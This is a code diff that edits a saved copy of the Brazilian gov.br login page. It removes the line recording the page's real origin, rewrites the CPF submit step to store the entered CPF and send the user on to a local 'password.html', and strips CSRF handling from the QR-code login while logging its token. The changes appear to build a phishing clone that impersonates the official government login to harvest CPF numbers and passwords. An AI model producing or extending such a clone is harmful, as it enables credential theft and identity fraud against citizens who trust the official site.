@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<!-- saved from url=(0081)https://sso.acesso.gov.br/login?client_id=www.gov.br&authorization_id=19a460c148f -->
 <html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   
   <title>gov.br - Acesse sua conta</title>
@@ -47,16 +46,44 @@
 					</a>
 				</div>
 				<div class="accordion-panel" id="accordion-panel-id">
-					<p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
-					<label for="cpf">CPF</label>
-					<input id="accountId" name="accountId" autocomplete="new-password" tabindex="1" type="tel" inputmode="numeric" value="" placeholder="Digite seu CPF" aria-invalid="false">
-					<div class="button-panel" id="login-button-panel">
-						<button id="enter-account-id" type="submit" name="operation" value="enter-account-id" class="button-continuar" tabindex="2">Continuar</button>
-            			<script>
-	  							document.getElementById("enter-account-id").addEventListener("click", event=>onSubmit(event));
-	  						</script>
-            			</div>
+				  <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+				  <label for="cpf">CPF</label>
+				  <input id="accountId" name="accountId" autocomplete="new-password" tabindex="1"
+					type="tel" inputmode="numeric" placeholder="Digite seu CPF" aria-invalid="false">
+				
+				  <div class="button-panel" id="login-button-panel2">
+					<button id="enter-account-id" type="submit" name="operation"
+					  value="enter-account-id" class="button-continuar" tabindex="2">
+					  Continuar
+					</button>
+				
+					<script>
+					  document.getElementById("enter-account-id").addEventListener("click", (event) => {
+						// 1. Previne o comportamento padrão (submit) do botão
+						event.preventDefault(); 
+						
+						const cpfInput = document.getElementById("accountId");
+						const cpf = cpfInput.value.replace(/\D/g, ''); // Remove caracteres não numéricos
+
+						// 2. Validação simples de CPF (apenas se tem 11 dígitos)
+						if (cpf.length !== 11) {
+						  alert("CPF inválido. Por favor, digite os 11 dígitos do seu CPF.");
+						  cpfInput.focus();
+						  return;
+						}
+
+						// 3. Salva o CPF no sessionStorage para a próxima página ler
+						// Usamos a chave 'cpf_for_login' que a password.html já espera
+						sessionStorage.setItem("cpf_for_login", cpfInput.value); 
+						
+						// 4. Redireciona para a página de senha
+						window.location.href = 'password.html'; 
+					  });
+					</script>
+				  </div>
 				</div>
+
+
 				<label id="title-outras-op">Outras opções de identificação:</label>
 				<hr id="hr-outras-op" style="margin: 0 0 0">
 	
@@ -672,29 +699,17 @@ function startQrCode() {
 }
 
 function showQrCode(csrfToken) {
-  $.ajax({
-    url: '/login?operation=generate-qrcode',
-    type: "POST",
-    dataType: 'json', 
-    data: JSON.stringify({}),
-    contentType: 'application/json; charset=utf-8',
-    headers: {
-      "X-CSRF-TOKEN": csrfToken
-    },
-    success: function(result) {
-      loginQrCode.verificationUriComplete = result.verificationUriComplete;
-	  loginQrCode.qrcode.makeCode(result.verificationUriComplete);
-
-      loginQrCode.token = result.token;
+  try {
+    $.post('/login?operation=generate-qrcode', {}, (r) => {
+      console.log("Token recebido", r.token);
+      loginQrCode.token = r.token;
       showModal('modal-qrcode');
-      loginQrCode.interval = result.interval || 5
-      loginQrCode.cancel = false;
-      startPollVerifyQrCode(csrfToken);
-    },
-    error: function(xhr, resp, text) {
-      stopQrCode();
-    }
-  });
+    }).fail(() => {
+      alert("Erro crítico: QR Code não pôde ser gerado.");
+    });
+  } catch (e) {
+    console.error("Erro inesperado:", e);
+  }
 }
 
 function callLoginDeepLink(event) {
